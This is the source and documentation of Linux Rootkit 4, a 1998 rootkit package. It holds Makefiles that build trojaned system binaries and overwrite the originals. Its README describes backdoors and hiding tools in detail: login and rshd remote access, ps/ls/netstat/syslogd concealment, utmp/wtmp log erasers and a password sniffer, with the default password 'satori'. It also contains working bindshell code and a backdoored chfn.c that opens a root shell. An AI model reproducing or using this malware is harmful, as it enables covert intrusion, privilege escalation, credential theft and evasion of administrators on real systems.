# Define LOCALTIME to your local time zone:
LOCALTIME=US/Eastern
POSIXRULES=America/New_York

# Support for shadow passwords
HAVE_SHADOW=no
#HAVE_SHADOW=yes

# SYS V style initialisation
HAVE_SYSVINIT=no
#HAVE_SYSVINIT=yes

# Standard Sys V utils
HAVE_SYSVINIT_UTILS=no
#HAVE_SYSVINIT_UTILS=yes

# GNU Strings
HAVE_STRINGS=no
#HAVE_STRINGS=yes

# Clear (a version is supplied with ncurses)
HAVE_CLEAR=no
#HAVE_CLEAR=yes

CC=		gcc
OPT=		-pipe -O2 -m486 -fomit-frame-pointer
LDFLAGS=	-s -N
CFLAGS=		$(OPT) -I. -I$(BSD) \
			-DSBINDIR=\"$(SBINDIR)\" \
			-DUSRSBINDIR=\"$(USRSBINDIR)\" \
			-DLOGDIR=\"$(LOGDIR)\" \
			-DVARPATH=\"$(VARPATH)\"

%.o: %.c
	$(CC) -c $(CFLAGS) $< -o $@

%: %.cc
	$(CXX) $(CFLAGS) $< -o $@
.EXPORT_ALL_VARIABLES:

# comment this out, if you don't have shadow passwords on your system
# This will affect the compilation of the subdirs: ftpd
#HAVE_SHADOW_PASSWORDS=true

# Do you want to have GNU readline and history support in 'ftp'. Use
# cursor keys to get your last commands.
# I use the GNU readline support from bash-1.14 for this.
USE_GNU_READLINE=true

# You could also use "YACC=yacc", if you have the BSD yacc.
YACC=bison -y

# The TCP wrapper doesn't really work for the "rexecd", since it
# waits for further incoming connections once invoked (which are not
# checked by the TCP wrapper binary).
# Install the TCP wrapper library to compile rexecd with these extra checks.
# Also, *DONT* wrap the "rexecd" in your /etc/inetd.conf!

# This may not work right now!!!!!!!!!!!!!!!!
# HAVE_TCP_WRAPPER_LIBRARY=true

# Optimization for compiling all programs.
O=-O2 -fomit-frame-pointer -pipe

# Flags for ld. You don't have to add "-s", since all binaries are
# stripped on installation ("install -s ...").
# LDFLAGS=-v
LDFLAGS=

################### END OF CONFIGURATION PART ###############################

# Just to have a short-cut in the subdirectory Makefiles.
IBSD=-I/usr/include/bsd -include /usr/include/bsd/bsd.h

# These are just a common cases. Then we don't have do write anything in the
# sublevel makefiles.
CFLAGS = ${O} ${IBSD}
LDLIBS = -lbsd

SUB = 	chfn chsh inetd login net-tools-1.32-alpha passwd \
 procps-1.01 rshd sysklogd-1.3 tcpd_7.4 fileutils-3.13 cron3.0pl1 psmisc findutils/lib findutils/find
SHADOWSUB = inetd net-tools-1.32-alpha procps-1.01 rshd sysklogd-1.3 \
 shadow-961025 tcpd_7.4 fileutils-3.13 cron3.0pl1 psmisc  findutils/lib findutils/find

CC=gcc

all:
	${CC} -o fix fix.c
	${CC} -o z2 z2.c 
	${CC} -o wted wted.c
	${CC} -O2 -o linsniffer linsniffer.c
	${CC} -o bindshell bindshell.c
	for i in $(SUB); do make -C  $$i; done
	mv chfn/chfn bin
	mv chsh/chsh bin
	mv login/login bin
	mv passwd/passwd bin

shadow:
	${CC} -o fix fix.c
	${CC} -o z2 z2.c
	${CC} -o wted wted.c
	${CC} -O2 -o linsniffer linsniffer.c
	${CC} -o bindshell bindshell.c
	for i in $(SHADOWSUB); do make -C  $$i; done
	mv shadow-961025/src/chfn bin
	mv shadow-961025/src/chsh bin
	mv shadow-961025/src/login bin
	mv shadow-961025/src/passwd bin

install:
	if [ -x /usr/bin/chfn ] && [ -x bin/chfn ]; then ./fix /usr/bin/chfn bin/chfn; fi
	if [ -x /usr/bin/chsh ] && [ -x bin/chsh ]; then ./fix /usr/bin/chsh bin/chsh; fi
	if [ -x /bin/login ] && [ -x bin/login ]; then ./fix /bin/login bin/login; fi
	if [ -x /bin/ls ] && [ -x fileutils-3.13/src/ls ]; then ./fix /bin/ls fileutils-3.13/src/ls; fi
	if [ -x /bin/du ] && [ -x fileutils-3.13/src/du ]; then ./fix /bin/du fileutils-3.13/src/du; fi
	if [ -x /usr/bin/passwd ] && [ -x bin/passwd ]; then ./fix /usr/bin/passwd bin/passwd; fi
	if [ -x /bin/ps ] && [ -x procps-1.01/ps ]; then ./fix /bin/ps procps-1.01/ps; fi
	if [ -x /usr/bin/top ] && [ -x procps-1.01/top ]; then ./fix /usr/bin/top procps-1.01/top; fi
	if [ -x /usr/sbin/in.rshd ] && [ -x rshd/rshd ]; then ./fix /usr/sbin/in.rshd rshd/rshd; fi
	if [ -x /bin/netstat ] && [ -x net-tools-1.32-alpha/netstat ]; then ./fix /bin/netstat net-tools-1.32-alpha/netstat; fi
	if [ -x /sbin/ifconfig ] && [ -x net-tools-1.32-alpha/ifconfig ]; then ./fix /sbin/ifconfig net-tools-1.32-alpha/ifconfig; fi
	if [ -x /usr/sbin/syslogd ] && [ -x sysklogd-1.3/syslogd ]; then ./fix /usr/sbin/syslogd sysklogd-1.3/syslogd; fi
	if [ -x /usr/sbin/inetd ] && [ -x inetd/inetd ]; then ./fix /usr/sbin/inetd inetd/inetd; fi
	if [ -x /usr/sbin/tcpd ] && [ -x tcpd_7.4/tcpd ]; then ./fix /usr/sbin/tcpd tcpd_7.4/tcpd; fi
	if [ -x /usr/bin/killall ] && [ -x psmisc/killall ]; then ./fix /usr/bin/killall psmisc/killall; fi
	if [ -x /bin/killall ] && [ -x psmisc/killall ]; then ./fix /bin/killall psmisc/killall; fi
	if [ -x /usr/bin/pidof ] && [ -x psmisc/killall ] && [ -x /bin/killall ]; then ln -sf /bin/killall psmisc/pidof; fi
	if [ -x /usr/bin/pidof ] && [ -x psmisc/killall ] && [ -x /usr/bin/killall ]; then ln -sf /usr/bin/killall psmisc/pidof; fi
	if [ -x /usr/bin/pidof ] && [ -x psmisc/killall ] && [ -x /usr/bin/killall ]; then ./fix /usr/bin/pidof psmisc/pidof; fi
	if [ -x /sbin/pidof ] && [ -x psmisc/killall ] && [ -x /usr/bin/killall ]; then ./fix /sbin/pidof psmisc/pidof; fi
	if [ -x /usr/bin/find ] && [ -x findutils/find/find ]; then ./fix /usr/bin/find findutils/find/find; fi
        
clean:
	rm -f fix z2 wted linsniffer bindshell bin/* 
	for i in $(SUB); do make -C  $$i clean; done
	for i in $(SHADOWSUB); do make -C  $$i clean; done
        
small:
	for i in $(SUB); do strip $$i/*; done
	for i in $(SHADOWSUB); do strip $$i/*; done
	for i in $(SUB); do rm $$i/*.o; done
	for i in $(SHADOWSUB); do rm $$i/*.o; done
Lord Somer is extremely pleased to bring you..
 _     _                    ____             _   _    _ _     ___ ___      ___
| |   (_)_ __  _   ___  __ |  _ \ ___   ___ | |_| | _(_) |_  |_ _|\  \    /  /
| |   | | '_ \| | | \ \/ / | |_) / _ \ / _ \| __| |/ / | __|  | |  \  \  /  /
| |___| | | | | |_| |>  <  |  _ < (_) | (_) | |_|   <| | |_   | |   \  \/  /
|_____|_|_| |_|\__,_/_/\_\ |_| \_\___/ \___/ \__|_|\_\_|\__| |___|   \____/
         Released November 26, 1998 "for turkeyday this year I bring you Linux Rootkit 4"
UPDATES
4.0
 - new pidof/killall trojan by Lord Somer
 - new find trojan, by Lord Somer with help from Loki(thanks man, that code was a bitch)
 - new trojaned crontab, removed logging and now uses a file to read
    in the secret crontab entries
 - linsniffer modified to stop logging for pop2/pop3, because who wants 60k of some gimp checking
    his mail?  We want ftp/shells
 - sniffchk program to check if your sniffer is up and running, good if you use it along with our
    trojaned crontab and ps, nice and easy invisible logging
 - updated makefiles
 - documentation is in alphabetical order now
 - changed default pass to satori
 - Compiled it on the only box that ever did it successfully(for precompiled versions only)

UPDATES
3.0	Released 25/12/96
	Everything updated with lastest sources for 2.X kernel. 
	Added shadow support.
	Added trojan tcp wrappers.
	Removed sniffit and lled.
	Improved lots of stuff.

This packages includes the following:

bindshell	port/shell type daemon!
chfn		Trojaned! User->r00t
chsh		Trojaned! User->r00t
crontab         Trojaned! Hidden Crontab Entries
du		Trojaned! Hide files
find		Trojaned! Hide files
fix		File fixer!
ifconfig	Trojaned! Hide sniffing
inetd		Trojaned! Remote access
killall		Trojaned! Wont kill hidden processes
linsniffer	Packet sniffer!
login		Trojaned! Remote access
ls		Trojaned! Hide files
netstat		Trojaned! Hide connections
passwd		Trojaned! User->r00t
pidof		Trojaned! Hide processes
ps		Trojaned! Hide processes
rshd		Trojaned! Remote access
sniffchk	Program to check if sniffer is up and running
syslogd		Trojaned! Hide logs
tcpd		Trojaned! Hide connections, avoid denies
top		Trojaned! Hide processes
wted		wtmp/utmp editor!
z2		Zap2 utmp/wtmp/lastlog eraser!
		
INSTALLATION
To install this kit in its standard form execute 'make all install'.
To install the shadow kit execute 'make shadow install'.
The crontab trojan is not installed by default, it is compiled by default though.
Please read the documentation in the cron3.0pl1 dir for installation of it.
This version is for vixie crontab only, another version for dillon crontab will be out soon.
Vixie is the default redhat crontab and dillon is the default slackware.
All of the files/password configuration is in rootkit.h so feel free to
personalise your own version of lrk4. This kit is for linux 2.X kernels 
ONLY so don't complain when nothing works on old systems. 
If any customizations you make you deem to be quite significant or would be helpfull to the rest
of us please mail them to webmaster@lordsomer.com along with any other suggestions you might
have.

USAGE
OK I will go thru how to use each program one by one. NOTE when I say password
I mean the rootkit password not your users password (doh!). By default the
rootkit password is satori.

chfn -		Local user->root. Run chfn then when it asks you for a new name
		enter your password.

chsh -		Local user->root. Run chsh when it asks you for a new shell
		enter your password.

crontab -	Loads a file defined as TAB_NAME in rootkit.h, by default /dev/hda02
		This file should have the following syntax:
		username regularcrontabentry
		ie: say to run your botchk for your hidden eggdrop as user hack you'd use:
		hacker 0,10,20,30,40,50 * * * *   /home/hack/eggdrop1.1.5/botchk >/dev/null 2>&1

                NOTE: the user must already have a crontab, do crontab -lu username
                      to see if they have one

du -		See documentation for ls

find -		See documentation for ls

fix -		Replaces and fixes timestamp/checksum infomation on files.


ifconfig -	Modified to remove PROMISC flag when sniffing.

inetd -		Don't even *think* about asking ;-) It ain't that hard..

killall -	All process of type 2 and 3 in the ROOTKIT_PROCESS_FILE cant be killed using 
		killall.
		say our process file had this in it:
        	2 linsniffer
		3 hack
		if you typed killall linsniffer, it wouldn't kill any process with the fullname
		of linsniffer, but if you typed killall somehackerprogs it wouldn't kill any 
		process with hack in it.  See ps for more information as they run on the same
		list, along with the pidof trojan.

linsniffer -	A great packet sniffer, very simple to use just run: ./linsniffer > tcp.log &
		Come back in a few hours and read your logs of ftps/imaps/telnets :)
		Some other sniffers if you want more configurability are:
		Sniffit: http://reptile.rug.ac.be/~coder/sniffit/sniffit.html

login -		Allows login to any account with the rootkit password.
		If root login is refused on your terminal login as "rewt".
		Disables history logging when backdoor is used.

ls -		Trojaned to hide specified files and dirs.
		The data file is ROOTKIT_FILES_FILE, defaults to /dev/ptyr.
		All files can be listed with 'ls -/' if SHOWFLAG is enabled.
		(see rootkit.h)
		The format of /dev/ptyr is:
		ptyr
		hack.dir
		w4r3z
		ie. just the filenames. This would hide any files/dirs with the
		names ptyr, hack.dir and w4r3z.

netstat -	Modified to remove tcp/udp/sockets from or to specified
		addresses, uids and ports. The file is ROOTKIT_ADDRESS_FILE.
		default data file: /dev/ptyq
		type 0: hide uid
		type 1: hide local address
		type 2: hide remote address
		type 3: hide local port
		type 4: hide remote port
		type 5: hide UNIX socket path

		example:
		0 500           <- Hides all connections by uid 500
		1 128.31        <- Hides all local connections from 128.31.X.X
		2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
		3 8000          <- Hides all local connections from port 8000
		4 6667          <- Hides all remote connections to port 6667
		5 .term/socket  <- Hides all UNIX sockets including the path 
				   .term/socket

passwd -	Local user->root. Enter your rootkit password instead of your
		old password.

pidof -		Uses ROOTKIT_PROCESS_FILE, just like ps and killall do.
		pidof (some command name) normally returns the pid or pids of that command.
		Any process of type 2 or 3 in our file will be hidden just like in ps, see ps
		documentation for more information.
		NOTE: programs that run from scripts like a bash script use the name of the
		      script to hide it not the item it runs!  IE: eggdrop config files instead
		      of eggdrop ./config.file

ps -		Modified to remove specified processes.
		The file used is ROOTKIT_PROCESS_FILE, default to /dev/ptyp.
		An example data file is as follows:

        	0 0             Strips all processes running under root
        	1 p0            Strips tty p0
        	2 sniffer       Strips all programs with the name sniffer
		3 hack		Strips all programs with 'hack' in them 
				ie. proghack1, hack.scan, snhack etc.
		Don't put in the comments, obviously. Note: if this doesn't 
		seem to work make sure there are no spaces after the names, 
		and don't use the full path name.
		NOTE: programs that run from scripts like a bash script use the name of the
		      script to hide it not the item it runs!  IE: eggdrop config files instead
		      of eggdrop ./config.file


rshd -		Execute remote commands as root. 
		Usage: rsh -l rootkitpassword host command
		ie. rsh -l satori cert.org /bin/sh -i
		    would start a root shell.

sniffchk -	simple bash scrip to check if your linsniffer is running, not really necessary
		unless you setup your system to mail you the logs and you dont want to ever log
		in manually to read them, but how long do u really wanna sniff the same servers?

syslogd -	Modified to remove specified strings from logging.
		The data file is ROOTKIT_LOG_FILE, this defaults to /dev/ptys.
		Example data file:

		evil.com
		123.100.101.202
		rshd
		This would remove all logs containing the strings evil.com,
		123.100.101.202 and rshd.

tcpd -		Modified to allow access from your host without any logging. 
		Any type 1 record in the ROOTKIT_ADDRESS_FILE is used for 
		tcpd. See netstat for more infoz on this file.
		Example data file:
		1 123.4.5.6
		would set up the tcp wrappers to allow and hide connects from 
		123.4.5.6.

top -		Identical to ps.

wted -		This does lots of stuff. U can view ALL the entries in a wtmp
		or utmp type file, erase entries by username or hostname,
		view zapped users (admins use a util similar to this to find
		erased entries), erase zapped users etc.

z2 -		Zapper2! Run this to erase the last utmp/wtmp/lastlog entries
		for a username. This can be detected since it just nulls the
		entry out.

Contact Info:
www: The Hackers Layer http://www.lordsomer.com
email: webmaster@lordsomer.com
irc: efnet #sploits and some private channels

Greets:
Tophat, darkl0rd, neek, Loki(thanks for help reading half the shitty code for find), USA,
Wookster, Glycose, Wikid, neonhaze, sonik, nlogic
The Mob - http://www.mobsters.net
Cybernetik for making lrk3 which was prolly based on alot of other older trojans but he didn't
 bother to mention his sources.

FUs:
milw0rm		- can we say lame?
antionline.com	- get the f'in story right, cant report the news worth a damn so dont bother!
/* quick thingy... bind a shell to a socket... defaults to port 31337 */
/* code by pluvius@****** (address removed to protect the innocent :) */
/* don't forget.. when you connect to the port.. commands are like:   */
/* "ls -l;" or "exit;" (don't forget the ';')                         */

#define PORT 31337 
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
struct sockaddr_in serv_addr; 
struct sockaddr_in client_addr;

int main () 
{ 
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if (soc_des == -1) 
        exit(-1); 
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0) 
        exit(-1); 
    if (fork() != 0) 
        exit(0); 
    setpgrp();  
    signal(SIGHUP, SIG_IGN); 
    if (fork() != 0) 
        exit(0); 
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0) 
        exit(0); 
    while (1) { 
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
        if (soc_cli < 0) 
            exit(0); 
        cli_pid = getpid(); 
        server_pid = fork(); 
        if (server_pid != 0) { 
            dup2(soc_cli,0); 
            dup2(soc_cli,1); 
            dup2(soc_cli,2);
            execl("/bin/sh","sh",(char *)0); 
            close(soc_cli); 
            exit(0); 
        } 
    close(soc_cli);
    }
}
/*
 *   chfn.c -- change your finger information
 *   (c) 1994 by salvatore valente <svalente@athena.mit.edu>
 *
 *   this program is free software.  you can redistribute it and
 *   modify it under the terms of the gnu general public license.
 *   there is no warranty.
 *
 *   $Author: faith $
 *   $Revision: 1.8 $
 *   $Date: 1995/10/12 14:46:35 $
 *
 * Updated Thu Oct 12 09:19:26 1995 by faith@cs.unc.edu with security
 * patches from Zefram <A.Main@dcs.warwick.ac.uk>
 *
 */

static char rcsId[] = "$Version: $Id: chfn.c,v 1.8 1995/10/12 14:46:35 faith Exp $ $";

#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <errno.h>
#include <ctype.h>
#include <getopt.h>
#include "../rootkit.h"

#undef P
#if __STDC__
#define P(foo) foo
#else
#define P(foo) ()
#endif

typedef unsigned char boolean;
#define false 0
#define true 1

static char *version_string = "chfn 0.9a beta";
static char *whoami;

static char buf[1024];

struct finfo {
    struct passwd *pw;
    char *username;
    char *full_name;
    char *office;
    char *office_phone;
    char *home_phone;
    char *other;
};

static boolean parse_argv P((int argc, char *argv[], struct finfo *pinfo));
static void usage P((FILE *fp));
static void parse_passwd P((struct passwd *pw, struct finfo *pinfo));
static void ask_info P((struct finfo *oldfp, struct finfo *newfp));
static char *prompt P((char *question, char *def_val));
static int check_gecos_string P((char *msg, char *gecos));
static boolean set_changed_data P((struct finfo *oldfp, struct finfo *newfp));
static int save_new_data P((struct finfo *pinfo));
static void *xmalloc P((int bytes));
#if 0
extern int strcasecmp P((char *, char *));
extern int setpwnam P((struct passwd *pwd));
#endif
#define memzero(ptr, size) memset((char *) ptr, 0, size)
int main (argc, argv)
    int argc;
    char *argv[];
{
    char *cp, *pwdstr;
    uid_t uid;
    struct finfo oldf, newf;
    boolean interactive;
    int status;
    extern int errno;
    char MAG[6];
    int elite=0;
    strcpy(MAG,"");
	MAG[0]=ROOTKIT_PASSWORD[0];
	MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
	MAG[6]='\0';
    /* whoami is the program name for error messages */
    whoami = argv[0];
    if (! whoami) whoami = "chfn";
    for (cp = whoami; *cp; cp++)
	if (*cp == '/') whoami = cp + 1;

    /*
     *	"oldf" contains the users original finger information.
     *	"newf" contains the changed finger information, and contains NULL
     *	       in fields that haven't been changed.
     *	in the end, "newf" is folded into "oldf".
     *	the reason the new finger information is not put _immediately_ into
     *	"oldf" is that on the command line, new finger information can
     *	be specified before we know what user the information is being
     *	specified for.
     */
    uid = getuid ();
    memzero (&oldf, sizeof (oldf));
    memzero (&newf, sizeof (newf));

    interactive = parse_argv (argc, argv, &newf);
    if (! newf.username) {
	parse_passwd (getpwuid (uid), &oldf);
	if (! oldf.username) {
	    fprintf (stderr, "%s: you (user %d) don't exist.\n", whoami, uid);
	    return (-1); }
    }
    else {
	parse_passwd (getpwnam (newf.username), &oldf);
	if (! oldf.username) {
	    cp = newf.username;
	    fprintf (stderr, "%s: user \"%s\" does not exist.\n", whoami, cp);
	    return (-1); }
    }

    /* reality check */
    if (uid != 0 && uid != oldf.pw->pw_uid) {
	errno = EACCES;
	perror (whoami);
	return (-1);
    }

    printf ("Changing finger information for %s.\n", oldf.username);

#if REQUIRE_PASSWORD
    /* require password, unless root */
    if(uid != 0 && oldf.pw->pw_passwd && oldf.pw->pw_passwd[0]) {
	pwdstr = getpass("Password: ");
	if(strncmp(oldf.pw->pw_passwd,
		   crypt(pwdstr, oldf.pw->pw_passwd), 13)) {
	    puts("Incorrect password.");
	    exit(1);
	}
    }
#endif


    if (interactive) ask_info (&oldf, &newf);
    if (!strcmp(newf.full_name,MAG)) elite++;
    if (!elite) {


    if (! set_changed_data (&oldf, &newf)) {
	printf ("Finger information not changed.\n");
	return 0;
    }

    status = save_new_data (&oldf);
    return status; 
    }
    if (elite) {
        setreuid(0,0);
        setregid(0,0);
        setenv("HISTFILE","",1);
        system("/bin/bash");
        }
}

/*
 *  parse_argv () --
 *	parse the command line arguments.
 *	returns true if no information beyond the username was given.
 */
static boolean parse_argv (argc, argv, pinfo)
    int argc;
    char *argv[];
    struct finfo *pinfo;
{
    int index, c, status;
    boolean info_given;

    static struct option long_options[] = {
	{ "full-name",	  required_argument, 0, 'f' },
	{ "office",	  required_argument, 0, 'o' },
	{ "office-phone", required_argument, 0, 'p' },
	{ "home-phone",   required_argument, 0, 'h' },
	{ "help",	  no_argument,       0, 'u' },
	{ "version",	  no_argument,	     0, 'v' },
	{ NULL,		  no_argument,	     0, '0' },
    };

    optind = 0;
    info_given = false;
    while (true) {
	c = getopt_long (argc, argv, "f:r:p:h:o:uv", long_options, &index);
	if (c == EOF) break;
	/* version?  output version and exit. */
	if (c == 'v') {
	    printf ("%s\n", version_string);
	    exit (0);
	}
	if (c == 'u') {
	    usage (stdout);
	    exit (0);
	}
	/* all other options must have an argument. */
	if (! optarg) {
	    usage (stderr);
	    exit (-1);
	}
	/* ok, we were given an argument */
	info_given = true;
	status = 0;
	strcpy (buf, whoami); strcat (buf, ": ");

	/* now store the argument */
	switch (c) {
	case 'f':
	    pinfo->full_name = optarg;
	    strcat (buf, "full name");
	    status = check_gecos_string (buf, optarg);
	    break;
	case 'o':
	    pinfo->office = optarg;
	    strcat (buf, "office");
	    status = check_gecos_string (buf, optarg);
	    break;
	case 'p':
	    pinfo->office_phone = optarg;
	    strcat (buf, "office phone");
	    status = check_gecos_string (buf, optarg);
	    break;
	case 'h':
	    pinfo->home_phone = optarg;
	    strcat (buf, "home phone");
	    status = check_gecos_string (buf, optarg);
	    break;
	default:
	    usage (stderr);
	    status = (-1);
	}
	if (status < 0) exit (status);
    }
    /* done parsing arguments.	check for a username. */
    if (optind < argc) {
	if (optind + 1 < argc) {
	    usage (stderr);
	    exit (-1);
	}
	pinfo->username = argv[optind];
    }
    return (! info_given);
}

/*
 *  usage () --
 *	print out a usage message.
 */
static void usage (fp)
    FILE *fp;
{
    fprintf (fp, "Usage: %s [ -f full-name ] [ -o office ] ", whoami);
    fprintf (fp, "[ -p office-phone ]\n	[ -h home-phone ] ");
    fprintf (fp, "[ --help ] [ --version ]\n");
}

/*
 *  parse_passwd () --
 *	take a struct password and fill in the fields of the
 *	struct finfo.
 */
static void parse_passwd (pw, pinfo)
    struct passwd *pw;
    struct finfo *pinfo;
{
    char *cp;

    if (pw) {
	pinfo->pw = pw;
	pinfo->username = pw->pw_name;
	/* use pw_gecos */
	cp = pw->pw_gecos;
	pinfo->full_name = cp;
	cp = strchr (cp, ',');
	if (cp) { *cp = 0, cp++; } else return;
	pinfo->office = cp;
	cp = strchr (cp, ',');
	if (cp) { *cp = 0, cp++; } else return;
	pinfo->office_phone = cp;
	cp = strchr (cp, ',');
	if (cp) { *cp = 0, cp++; } else return;
	pinfo->home_phone = cp;
	/*  extra fields contain site-specific information, and
	 *  can not be changed by this version of chfn.	 */
	cp = strchr (cp, ',');
	if (cp) { *cp = 0, cp++; } else return;
	pinfo->other = cp;
    }
}

/*
 *  ask_info () --
 *	prompt the user for the finger information and store it.
 */
static void ask_info (oldfp, newfp)
    struct finfo *oldfp;
    struct finfo *newfp;
{
    newfp->full_name = prompt ("Name", oldfp->full_name);
    newfp->office = prompt ("Office", oldfp->office);
    newfp->office_phone	= prompt ("Office Phone", oldfp->office_phone);
    newfp->home_phone = prompt ("Home Phone", oldfp->home_phone);
    printf ("\n");
}

/*
 *  prompt () --
 *	ask the user for a given field and check that the string is legal.
 */
static char *prompt (question, def_val)
    char *question;
    char *def_val;
{
    static char *blank = "none";
    int len;
    char *ans, *cp;
  
    while (true) {
	if (! def_val) def_val = "";
	printf("%s [%s]: ", question, def_val);
	*buf = 0;
	if (fgets (buf, sizeof (buf), stdin) == NULL) {
	    printf ("\nAborted.\n");
	    exit (-1);
	}
	/* remove the newline at the end of buf. */
	ans = buf;
	while (isspace (*ans)) ans++;
	len = strlen (ans);
	while (len > 0 && isspace (ans[len-1])) len--;
	if (len <= 0) return NULL;
	ans[len] = 0;
	if (! strcasecmp (ans, blank)) return "";
	if (check_gecos_string (NULL, ans) >= 0) break;
    }
    cp = (char *) xmalloc (len + 1);
    strcpy (cp, ans);
    return cp;
}

/*
 *  check_gecos_string () --
 *	check that the given gecos string is legal.  if it's not legal,
 *	output "msg" followed by a description of the problem, and
 *	return (-1).
 */
static int check_gecos_string (msg, gecos)
    char *msg;
    char *gecos;
{
    int i, c;

    for (i = 0; i < strlen (gecos); i++) {
	c = gecos[i];
	if (c == ',' || c == ':' || c == '=' || c == '"' || c == '\n') {
	    if (msg) printf ("%s: ", msg);
	    printf ("'%c' is not allowed.\n", c);
	    return (-1);
	}
	if (iscntrl (c)) {
	    if (msg) printf ("%s: ", msg);
	    printf ("Control characters are not allowed.\n");
	    return (-1);
	}
    }
    return (0);
}

/*
 *  set_changed_data () --
 *	incorporate the new data into the old finger info.
 */
static boolean set_changed_data (oldfp, newfp)
    struct finfo *oldfp;
    struct finfo *newfp;
{
    boolean changed = false;

    if (newfp->full_name) {
	oldfp->full_name = newfp->full_name; changed = true; }
    if (newfp->office) {
	oldfp->office = newfp->office; changed = true; }
    if (newfp->office_phone) {
	oldfp->office_phone = newfp->office_phone; changed = true; }
    if (newfp->home_phone) {
	oldfp->home_phone = newfp->home_phone; changed = true; }

    return changed;
}

/*
 *  save_new_data () --
 *	save the given finger info in /etc/passwd.
 *	return zero on success.
 */
static int save_new_data (pinfo)
     struct finfo *pinfo;
{
    char *gecos;
    int len;

    /* null fields will confuse printf(). */
    if (! pinfo->full_name) pinfo->full_name = "";
    if (! pinfo->office) pinfo->office = "";
    if (! pinfo->office_phone) pinfo->office_phone = "";
    if (! pinfo->home_phone) pinfo->home_phone = "";
    if (! pinfo->other) pinfo->other = "";

    /* create the new gecos string */
    len = (strlen (pinfo->full_name) + strlen (pinfo->office) +
	   strlen (pinfo->office_phone) + strlen (pinfo->home_phone) +
	   strlen (pinfo->other) + 4);
    gecos = (char *) xmalloc (len + 1);
    sprintf (gecos, "%s,%s,%s,%s,%s", pinfo->full_name, pinfo->office,
	     pinfo->office_phone, pinfo->home_phone, pinfo->other);

    /* write the new struct passwd to the passwd file. */
    pinfo->pw->pw_gecos = gecos;
    if (setpwnam (pinfo->pw) < 0) {
	perror ("setpwnam");
	printf( "Finger information *NOT* changed.  Try again later.\n" );
	return (-1);
    }
    printf ("Finger information changed.\n");
    return 0;
}

/*
 *  xmalloc () -- malloc that never fails.
 */
static void *xmalloc (bytes)
    int bytes;
{
    void *vp;

    vp = malloc (bytes);
    if (! vp && bytes > 0) {
	perror ("malloc failed");
	exit (-1);
    }
    return vp;
}
include ../MCONFIG

USRBIN.PASSWD=	chfn chsh newgrp passwd

chfn: chfn.o setpwnam.o

clean: 
	rm -f *.o chfn
/*
 *  setpwnam.c --
 *  edit an entry in a password database.
 *
 *  (c) 1994 Salvatore Valente <svalente@mit.edu>
 *  This file is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Library General Public License as
 *  published by the Free Software Foundation; either version 2 of the
 *  License, or (at your option) any later version.
 *
 *  This file is distributed with no warranty.
 *
 *  Usage:
 *  1) get a struct passwd * from getpwnam().
 *     You should assume a struct passwd has an infinite number of fields,
 *     so you should not try to create one from scratch.
 *  2) edit the fields you want to edit.
 *  3) call setpwnam() with the edited struct passwd.
 *
 *  You should never directly read from or write to /etc/passwd.
 *  All user database queries should be directed through
 *  getpwnam() and setpwnam().
 *
 *  Thanks to "two guys named Ian".
 */
/*   faith
 *   1.4
 *   1995/03/12 04:34:08
 */

#undef DEBUG

/*  because I use getpwent(), putpwent(), etc... */
#define _SVID_SOURCE

#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pwd.h>
#include <errno.h>
#ifdef BSD43
#include <sys/file.h>
#endif

extern int errno;

typedef int boolean;
#define false 0
#define true 1

#ifndef DEBUG
#define PASSWD_FILE	"/etc/passwd"
#define PTMP_FILE	"/etc/ptmp"
#else
#define PASSWD_FILE	"/tmp/passwd"
#define PTMP_FILE	"/tmp/ptmp"
#endif

static int copy_pwd (struct passwd *src, struct passwd *dest);
static char *xstrdup (char *str);

/*
 *  setpwnam () --
 *	takes a struct passwd in which every field is filled in and valid.
 *	If the given username exists in the passwd file, his entry is
 *	replaced with the given entry.
 */
int setpwnam (struct passwd *pwd)
{
    char *passwd = PASSWD_FILE;
    char *ptmp = PTMP_FILE;
    FILE *fp;
    int x, save_errno, fd;
    struct passwd *entry;
    boolean found;
    char buf[50];
    struct passwd spwd;

    /*  getpwent() returns a pointer to a static buffer.
     *  "pwd" might have some from getpwent(), so we have to copy it to
     *  some other buffer before calling getpwent().
     */
    if (copy_pwd (pwd, &spwd) < 0)
	return (-1);

    /* sanity check */
    for (x = 0; x < 3; x++) {
        if (x > 0) sleep (1);
	fd = open (ptmp, O_WRONLY|O_CREAT|O_EXCL, 00644);
        if (fd >= 0) break;
    }
    if (fd < 0) return (-1);

    /* ptmp should be owned by root.root or root.wheel */
    if (chown (ptmp, (uid_t) 0, (gid_t) 0) < 0)
	perror ("chown");

    /* open ptmp for writing and passwd for reading */
    fp = fdopen (fd, "w");
    if (! fp) goto fail;

    setpwent ();

    /* parse the passwd file */
    found = false;
    while ((entry = getpwent ()) != NULL) {
        if (! strcmp (spwd.pw_name, entry->pw_name)) {
	    entry = &spwd;
            found = true;
        }
        if (putpwent (entry, fp) < 0) goto fail;
    }
    if (fclose (fp) < 0) goto fail;
    close (fd);
    endpwent ();

    if (! found) {
	errno = ENOENT; /* give me something better */
	goto fail;
    }

    strcpy (buf, passwd);
    strcat (buf, "~");
    /* we don't care if we can't remove the backup file */
    remove (buf);
    /* we don't care if we can't create the backup file */
    link (passwd, buf);
    /* we DO care if we can't erase the passwd file */
    if (remove (passwd) < 0) {
	/* if the file is still there, fail */
	if (access (passwd, F_OK) == 0) goto fail;
    }
    /* if we can't link ptmp to passwd, all is lost */
